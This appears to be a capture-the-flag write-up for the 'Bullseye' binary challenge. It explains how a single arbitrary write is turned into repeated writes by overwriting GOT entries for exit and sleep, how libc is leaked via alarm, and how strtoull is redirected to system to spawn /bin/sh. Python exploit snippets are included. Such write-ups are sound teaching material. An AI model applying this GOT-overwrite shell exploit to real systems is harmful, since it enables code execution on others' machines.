# H@cktivityCon CTF 2020 `Bullseye` Writeup
Category Binary Exploitation  
Points: 150

## Description
```
You have one shot, don't miss.
```
_Couldn't find the actual description, so this is just the first line the binary prints_

---
 
 Where I learn about overwriting the GOT to make use of arbitrary writes

 # Recon
 We are given a single binary, `bullseye`

 ```
 > file bullseye
 bullseye: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e1968fcbe7c510329f863f4d6af48643ef947b29, for GNU/Linux 3.2.0, not stripped

 > checksec --file=bullseye
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   81) Symbols       No    0               3               bullseye
 ```

 No PIE and Partial Relro, which ends up being important, and no stack canaries, which doesn't really.

When run the binary claims to write an arbitrary value to an arbitrary address. And it will in fact segfault if we try to write to an invalid address.

```
> ./bullseye
You have one write, don't miss.

Where do you want to write to?
0
What do you want to write?
1234
Segmentation fault
```

Lets open it up in ghidra and take a look

```c
void main(void)
{
  ulonglong *pointer;
  ulonglong value;
  char buffer [24];
  
  setup();
  puts("You have one write, don\'t miss.\n");
  puts("Where do you want to write to?");
  read(0,buffer,0x10);
  pointer = (ulonglong *)strtoull(buffer,(char **)0x0,0x10);
  memset(buffer,0,0x10);
  puts("What do you want to write?");
  read(0,buffer,0x10);
  value = strtoull(buffer,(char **)0x0,0x10);
  *pointer = value;
  sleep(0xf);
  printf("%p\n",alarm);
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

Does what it says on the tin, except for that little bit at the end. It looks like if
you manage to not segfault on the write and wait 15 seconds, the binary prints the address of the alarm function, which in turn tells us the address of libc. How very kind of it!

Still though, popping a shell with only a single write seems fairly difficult. Especially since the function calls exit and never returns, so a standard ROP is out of the question. It would be nice if we could do more than one write.

TODO: Insert note about one_gadget

## GOT milk?
When binaries are dynamically linked (like this one is) it doesn't know the address of external symbols (such as `exit` or `printf`) at compile time. Instead, the address are resolved at run time.

The way that happens is a complex process with lots of moving parts. The parts that interest us currently are the Procedure Linkage Table (PLT) and Global Offset Table (GOT). They are both areas of memory with a known, static offset to the binary that work together to allow external functions to be called.

When a function in a dynamic library is called (say `printf`), the following process occurs:

1. The call the `printf` is actually a call to `print@plt`, the index of `printf` in the PLT.
2. The first instruction at `printf@plt` is an indirect jump to the address stored at `printf@got`
3. If `printf` has been called before the offset has been loaded, so the jump points directly to the real `printf` and we are done.
4. Otherwise, the jump ends up calling the dynamic linker, which resolves the address of the real `printf` and patches up `printf@got` to point directly to it.

The GOT is writable by necessity, as the linker needs to update entries at runtime. And since we know the address of the GOT (the binary isn't position independent), we can overwrite one of the entries to an address of our choosing. Then, the next time that function gets called, execution will be directed to that address! (Note this is there the binary being marked as Partial RELRO matters. If the binary is marked as Full RELRO, all of the PLT entries are resolved at load time, and the pages of memory are marked as read only, mitigating this attack.)

So what function to choose, and where should we go? well like I said in the beginning, it sure would be nice if we could write more than once. Well, what if, when exit was called at the end of the function, execution was instead redirected back to the beginning of main?

```python
write_quad_where(stream, e.symbols["main"], e.got["exit"]) # loop on exit
```

Make sure to grab the address of `alarm` as it goes by:

```python
alarm_addr = int(stream.recvline(), base=16)
libc.address = alarm_addr - libc.symbols["alarm"]
```

Great, now we have an infinite loop. As many writes as we want. That 15 second pause was pretty annoying though. Now that we have the address of libc, we can set `sleep` to redirect execution back to `main` as well:

```python
write_quad_where(stream, e.symbols["main"], e.got["sleep"]) # loop on sleep
```

Now that we don't have to wait again, we can get on to calling `system`. The trick here is we need control over the arguments, so we can pass the requisite "/bin/sh". The easiest function is `strtoull`

```python
write_quad_where(stream, libc.sym["system"], e.got["strtoull"]) # replace strtoull with system
```

Once that's finished, the next call to `strtoull` (which will have a pointer to the string we just entered as it's first argument) will be redirected to `system` instead.

```python
stream.sendline("/bin/sh")

stream.interactive()
```

## Flag

The full exploit is available in `bullseye.py`

```
> cat flag.txt
flag{one_write_two_write_good_write_bad_write}
```

_Fin._